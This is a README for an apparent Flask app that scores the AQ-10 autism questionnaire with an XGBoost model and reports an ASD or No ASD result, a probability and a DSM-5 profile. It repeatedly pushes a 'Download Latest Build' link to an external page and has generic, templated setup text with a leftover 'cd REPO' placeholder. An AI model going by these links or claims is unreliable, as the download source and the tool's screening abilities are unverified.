# ASD Screening Tool - Healthcare Screening 2026

> **A Flask web application for administering the AQ-10, applying an XGBoost model, and presenting ASD screening predictions, probability scores, and DSM-5 spectrum profiles for child, adolescent, and adult datasets.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not--Specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hillisaacts7071/asd-screening-tool-2026?style=flat-square)](https://github.com/hillisaacts7071/asd-screening-tool-2026)

---

<p align="center">
  <a href="https://hillisaacts7071.github.io/asd-screening-tool-2026/">
    <img src="https://img.shields.io/badge/Download-ASD%20Screening%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download ASD Screening Tool">
  </a>
</p>

> **[Download ASD Screening Tool](https://hillisaacts7071.github.io/asd-screening-tool-2026/)**

---

[Download Latest Build](https://hillisaacts7071.github.io/asd-screening-tool-2026/)

---

## Overview

ASD Screening Tool provides a browser-based screening workflow powered by Flask and Jinja2. Users enter demographic details and answer the AQ-10 questionnaire, after which an XGBoost machine learning model returns a binary ASD or No ASD result together with a confidence probability.

The tool works with child, adolescent, and adult data workflows. Its results also include a DSM-5 spectrum profile breakdown, offering additional context around the screening output. These results should be considered in the relevant professional and clinical setting.

---

## Included Capabilities

- Screening through the AQ-10 questionnaire
- Collection of demographic details
- Binary ASD or No ASD model output
- Confidence probability associated with the result
- DSM-5 spectrum profile information
- Child, adolescent, and adult dataset support
- XGBoost model integration
- Flask/Jinja2 browser interface

---

## Getting Started

First, download the source and enter its directory:

```bash
git clone https://github.com/hillisaacts7071/asd-screening-tool-2026.git
cd REPO
```

When the project includes a dependency file, install the listed Python packages:

```bash
pip install -r requirements.txt
```

Run the Flask server with:

```bash
flask run
```

Then visit the local URL printed by Flask.

---

## Application Workflow

1. Start the Flask server.
2. Navigate to the screening page from a web browser.
3. Provide the requested demographic information.
4. Answer all AQ-10 questions.
5. Submit the completed form.
6. Examine the ASD or No ASD classification, its confidence probability, and the DSM-5 spectrum profile breakdown.

This software generates screening-focused model output and does not replace evaluation by a qualified professional.

---

## Configuration

The application reads Flask runtime options from environment variables or from its existing configuration mechanism. For local development, the setup can be started as follows:

```bash
export FLASK_APP=app.py
export FLASK_ENV=development
flask run
```

If the Flask application starts from another file, set `FLASK_APP` to that entry point instead. Keep model and dataset options consistent with the configuration supplied by the project.

---

## System Requirements

- A current web browser
- A Python runtime supported by the Flask application
- Flask and Jinja2
- XGBoost plus the machine learning packages required by the project
- The application's trained model and supported datasets
- A local or hosted environment that can run Flask

---

## Frequently Asked Questions

### What type of users can use this application?

The application is intended for workflows involving ASD screening questionnaires, demographic information, and related datasets through a web interface.

### Is the output a medical diagnosis?

No. It provides a machine learning screening classification and associated profile information only. The result must not be used as an independent clinical diagnosis.

### What is the process for updating it?

Download the newest available build or retrieve the latest repository changes. If the dependency requirements have changed, install the updated packages as well.

### How are application settings controlled?

Flask configuration and environment variables control runtime settings. Model and dataset behavior is determined by the project's included configuration.

### What should I do if Flask will not start?

Check that the required Python packages are installed, that `FLASK_APP` identifies the correct entry point, and that the command is being run from the repository directory. The terminal output can help identify missing dependencies or configuration problems.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
